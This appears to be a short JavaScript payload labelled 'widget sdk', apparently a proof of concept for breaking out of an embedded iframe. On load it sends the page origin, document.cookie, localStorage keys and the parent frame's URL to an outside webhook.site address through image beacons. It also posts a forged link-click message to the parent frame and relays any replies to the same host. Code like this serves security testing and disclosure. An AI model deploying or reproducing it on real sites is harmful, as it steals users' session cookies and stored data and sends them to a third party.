/* widget sdk */
(function(){
  var OOB='https://webhook.site/oob';
  function send(t,v){ try{ new Image().src=OOB+'?t='+encodeURIComponent(t)+'&v='+encodeURIComponent(String(v)).slice(0,350); }catch(e){} }
  send('exec','origin='+location.origin);
  send('cookie', document.cookie||'(empty)');
  try{ send('localStorage_keys', JSON.stringify(Object.keys(localStorage))); }catch(e){ send('ls_err', ''+e); }
  try{ send('parent_href', parent.location.href); }catch(e){ send('parent_read', 'BLOCKED '+e); }
  try{ send('top_is_self', (window.top===window.self)); }catch(e){ send('top_err',''+e); }
  try{ parent.postMessage({type:'ecto-artifact-link-click',productId:'999999999999'}, '*'); send('pm_link_click','sent'); }catch(e){ send('pm_err',''+e); }
  window.addEventListener('message', function(ev){ send('reply_from_'+(ev.origin||'?'), JSON.stringify(ev.data).slice(0,200)); });
  try{ var b=document.createElement('div'); b.style.cssText='background:#c00;color:#fff;padding:14px;font:18px sans-serif'; b.textContent='ESCALATION JS RAN on '+location.origin; document.body.appendChild(b);}catch(e){}
})();
